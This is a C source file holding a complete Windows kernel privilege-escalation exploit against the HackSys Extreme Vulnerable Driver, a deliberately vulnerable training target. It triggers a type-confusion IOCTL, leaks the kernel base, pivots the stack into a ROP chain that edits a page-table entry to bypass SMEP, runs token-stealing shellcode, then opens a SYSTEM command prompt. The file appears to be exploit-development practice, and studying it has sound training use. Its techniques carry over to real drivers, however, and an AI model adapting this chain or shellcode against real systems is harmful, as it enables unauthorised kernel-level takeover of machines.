#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>

#define TYPE_CONFUSION_IOCTL 0x222023
#define ARRAY_SIZE 1024
#define STACK_SIZE 0x14000

typedef uint64_t QWORD;

typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}

int main(int argc, char* argv[]) {

    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // get the kernel base to beat kASLR
    QWORD kernelBase = GetKernelBase();
    printf("[+] Kernel base: 0x%p\n", kernelBase);

    // test shellcode
    unsigned char shellcode[] = {
        
        0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 
        0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 
        0x00, 0x00, 0x49, 0x89, 0xc0, 0x41, 0xb9, 0x04, 
        0x00, 0x00, 0x00, 0x4d, 0x8b, 0x80, 0x48, 0x04, 
        0x00, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 0x00, 
        0x00, 0x4d, 0x39, 0x88, 0x40, 0x04, 0x00, 0x00, 
        0x75, 0xe9, 0x49, 0x8b, 0x88, 0xb8, 0x04, 0x00, 
        0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8, 
        0x04, 0x00, 0x00, 0x4c, 0x89, 0xdc, 0xc3

    };

    // allocate memory for the shellcode
    LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
        return 1;
    }

    printf("[+] Memory allocated: 0x%p\n", alloc);

    // copy the shellcode in to the memory
    RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copied to: 0x%p\n", alloc);

    // stack pivoting gadgets/values
    QWORD STACK_PIVOT_ADDR = 0xF6000000;
    QWORD MOV_ESP = kernelBase + 0x28bdbb;          // mov esp, 0xF6000000; ret;

    // ROP NOP
    QWORD ROP_NOP = kernelBase + 0x6390e1;          // ret;

    // INT3
    QWORD INT3 = kernelBase + 0x41ee15;             // int3; ret;

    // prepare the new stack
    QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
    LPVOID stack = VirtualAlloc((LPVOID)stackAddr, STACK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] User space stack, allocated address: 0x%p\n", stack);

    if (stack == 0x0)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
        return 1;
    }

    printf("[+] VirtualLock, address: 0x%p\n", stack);
    if (!VirtualLock((LPVOID)stack, STACK_SIZE)) {
        printf("[!] Error using VirtualLock. Error code: %u\n", GetLastError());
        return 1;
    }

    int index = 0;

    // SMEP disabling gadgets/values
    QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);


    for (int i = 0; i < 50; i++)
        *(rop + index++) = ROP_NOP;


    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
    *(rop + index++) = (QWORD)alloc;
    *(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                    // add rsp, 0x28; ret;
    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r10 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                    // rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                    // r8 = rcx = rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
    *(rop + index++) = (QWORD)0x4;
    *(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                    // rcx = rax = modified PTE value

    *(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                    // moves the modified PTE value to the PTE address

    *(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;
    
    // ret to user space shellcode
    *(rop + index++) = (QWORD)alloc;

    // allocate the userObject
    USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
    userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
    userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute

    printf("[!] Press a key to continue...\n");
    getchar();

    // trigger the bug
    DeviceIoControl(hDriver, TYPE_CONFUSION_IOCTL, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);

    system("cmd.exe");
}
